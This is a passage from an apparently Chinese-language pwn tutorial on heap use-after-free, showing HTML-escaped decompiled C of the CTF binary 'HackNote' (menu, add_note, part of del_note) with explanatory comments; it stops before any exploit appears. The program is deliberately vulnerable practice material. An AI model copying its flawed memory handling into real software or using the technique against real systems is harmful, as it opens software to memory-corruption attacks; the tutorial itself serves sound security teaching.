&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **envp)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v3; &lt;span class=&#34;comment&#34;&gt;// eax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf; &lt;span class=&#34;comment&#34;&gt;// [esp+8h] [ebp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v5; &lt;span class=&#34;comment&#34;&gt;// [esp+Ch] [ebp-Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v5 = __readgsdword(&lt;span class=&#34;number&#34;&gt;0x14&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  setvbuf(&lt;span class=&#34;built_in&#34;&gt;stdout&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  setvbuf(&lt;span class=&#34;built_in&#34;&gt;stdin&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      menu();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &amp;amp;buf, &lt;span class=&#34;number&#34;&gt;4u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v3 = atoi(&amp;amp;buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v3 != &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      del_note();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v3 &amp;gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v3 == &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        print_note();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v3 == &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LABEL_13:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Invalid choice&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v3 != &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_13;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      add_note();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

 &lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;----------------------&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;       HackNote       &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;----------------------&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot; 1. Add note          &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot; 2. Delete note       &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot; 3. Print note        &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot; 4. Exit              &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;----------------------&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Your choice :&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;add&lt;/p&gt;
&lt;p&gt;​		notelist这个链表存储内容,链表的每个节点分了两部分,第一部分4字节,存储print_note_content函数地址,第二部分也是一个指针,指向存储malloc的数据的chunk的地址.&lt;/p&gt;
&lt;p&gt;​		例如申请一个8字节大小的content,会得到&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-15-%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8BUse-After-Free/image-20230416105824835.png&#34; alt=&#34;image-20230416105824835&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add_note&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _DWORD *v0; &lt;span class=&#34;comment&#34;&gt;// ebx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;signed&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i; &lt;span class=&#34;comment&#34;&gt;// [esp+Ch] [ebp-1Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; size; &lt;span class=&#34;comment&#34;&gt;// [esp+10h] [ebp-18h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf; &lt;span class=&#34;comment&#34;&gt;// [esp+14h] [ebp-14h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v5; &lt;span class=&#34;comment&#34;&gt;// [esp+1Ch] [ebp-Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v5 = __readgsdword(&lt;span class=&#34;number&#34;&gt;0x14&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( count &amp;lt;= &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt; )  &lt;span class=&#34;comment&#34;&gt;//最多分配5个&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt;= &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;; ++i )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !notelist[i] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        notelist[i] = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;8u&lt;/span&gt;);  &lt;span class=&#34;comment&#34;&gt;//分配一个notelist节点&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !notelist[i] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Alloca Error&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *(_DWORD *)notelist[i] = print_note_content; &lt;span class=&#34;comment&#34;&gt;//存储put函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Note size :&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &amp;amp;buf, &lt;span class=&#34;number&#34;&gt;8u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        size = atoi(&amp;amp;buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v0 = notelist[i]; &lt;span class=&#34;comment&#34;&gt;//v0等于notelist的第一个8字节,存储put函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v0[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(size); &lt;span class=&#34;comment&#34;&gt;// v0第二个字节,存储真正要存储的数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !*((_DWORD *)notelist[i] + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) ) &lt;span class=&#34;comment&#34;&gt;//看有没有分配成功?&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Alloca Error&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content :&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, *((&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; **)notelist[i] + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;), size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Success !&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ++count;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __readgsdword(&lt;span class=&#34;number&#34;&gt;0x14&lt;/span&gt;u) ^ v5; &lt;span class=&#34;comment&#34;&gt;//这是啥??&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Full&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __readgsdword(&lt;span class=&#34;number&#34;&gt;0x14&lt;/span&gt;u) ^ v5;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;delete&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;del_note&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v1; &lt;span class=&#34;comment&#34;&gt;// [esp+4h] [ebp-14h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf; &lt;span class=&#34;comment&#34;&gt;// [esp+8h] [ebp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v3; &lt;span class=&#34;comment&#34;&gt;// [esp+Ch] [ebp-Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v3 = __readgsdword(&lt;span class=&#34;number&#34;&gt;0x14&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index :&amp;quot;&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//输入要释放的index&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &amp;amp;buf, &lt;span class=&#34;number&#34;&gt;4u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v1 = atoi(&amp;amp;buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v1 &amp;lt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; || v1 &amp;gt;= count )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Out of bound!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _exit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( notelist[v1] ) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(*((&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; **)notelist[v1] + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span 